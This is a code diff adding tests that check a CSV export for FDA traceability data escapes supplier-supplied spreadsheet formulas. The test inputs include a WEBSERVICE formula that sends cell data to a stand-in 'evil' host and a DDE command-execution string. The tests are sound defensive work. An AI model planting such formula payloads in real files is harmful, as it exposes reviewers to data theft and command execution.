@@ -46,9 +46,11 @@ from app.sqlalchemy_models import (
     UserModel,
 )
 from app.supplier_onboarding_routes import (
+    FDA_EXPORT_HEADERS,
     _build_fda_export_rows,
     _compute_funnel_summary,
     _compute_supplier_compliance,
+    _render_fda_export_csv,
     _render_fda_export_xlsx_fallback,
     _string_value,
     _xlsx_column_name,
@@ -88,9 +90,7 @@ def db() -> Session:
     session = SM()
     session.add(TenantModel(id=TENANT_ID, name="T", slug="t", status="active", settings={}))
     session.add(UserModel(id=USER_ID, email="u@example.com", status="active", is_sysadmin=False))
-    session.add(
-        UserModel(id=OTHER_USER_ID, email="other@example.com", status="active", is_sysadmin=False)
-    )
+    session.add(UserModel(id=OTHER_USER_ID, email="other@example.com", status="active", is_sysadmin=False))
     session.commit()
     try:
         yield session
@@ -501,3 +501,64 @@ class TestRenderFdaExportXlsxFallback:
         # Raw < should not appear (it would break XML)
         assert "<test>" not in sheet_xml
         assert "&lt;test&gt;" in sheet_xml
+
+
+# ---------------------------------------------------------------------------
+# _render_fda_export_csv, formula injection neutralization
+# ---------------------------------------------------------------------------
+
+
+class TestRenderFdaExportCsvFormulaNeutralization:
+    """Supplier controlled cells must not execute as formulas in Excel.
+
+    product_description, facility name, and reference document come from
+    supplier input. A value such as =WEBSERVICE(...) would run on the
+    reviewer's workstation when the CSV is opened, so every cell passes
+    through shared safe_cell before writing.
+    """
+
+    def _row(self, **overrides):
+        row = {
+            "event_id": "evt-1",
+            "tlc_code": "TLC-001",
+            "product_description": "Spinach",
+            "cte_type": "harvesting",
+            "facility_name": "Farm A",
+            "event_time": "2026-01-01T00:00:00Z",
+            "quantity": "10",
+            "unit_of_measure": "cases",
+            "reference_document": "BOL-1",
+            "payload_sha256": "abc",
+            "merkle_hash": "def",
+            "merkle_sequence": 1,
+        }
+        row.update(overrides)
+        return row
+
+    def _parse(self, payload: bytes):
+        import csv
+        import io
+
+        return list(csv.DictReader(io.StringIO(payload.decode("utf-8"))))
+
+    def test_formula_prefixed_product_and_facility_are_neutralized(self):
+        rows = [
+            self._row(
+                product_description='=WEBSERVICE("http://evil/?x="&A1)',
+                facility_name="=cmd|' /C calc'!A0",
+                reference_document="@malicious-doc",
+            )
+        ]
+        parsed = self._parse(_render_fda_export_csv(rows))
+        assert len(parsed) == 1
+        assert parsed[0][FDA_EXPORT_HEADERS["product_description"]] == '\'=WEBSERVICE("http://evil/?x="&A1)'
+        assert parsed[0][FDA_EXPORT_HEADERS["facility_name"]] == "'=cmd|' /C calc'!A0"
+        assert parsed[0][FDA_EXPORT_HEADERS["reference_document"]] == "'@malicious-doc"
+
+    def test_safe_values_are_byte_identical(self):
+        rows = [self._row()]
+        parsed = self._parse(_render_fda_export_csv(rows))
+        assert parsed[0][FDA_EXPORT_HEADERS["product_description"]] == "Spinach"
+        assert parsed[0][FDA_EXPORT_HEADERS["facility_name"]] == "Farm A"
+        assert parsed[0][FDA_EXPORT_HEADERS["reference_document"]] == "BOL-1"
+        assert parsed[0][FDA_EXPORT_HEADERS["tlc_code"]] == "TLC-001"
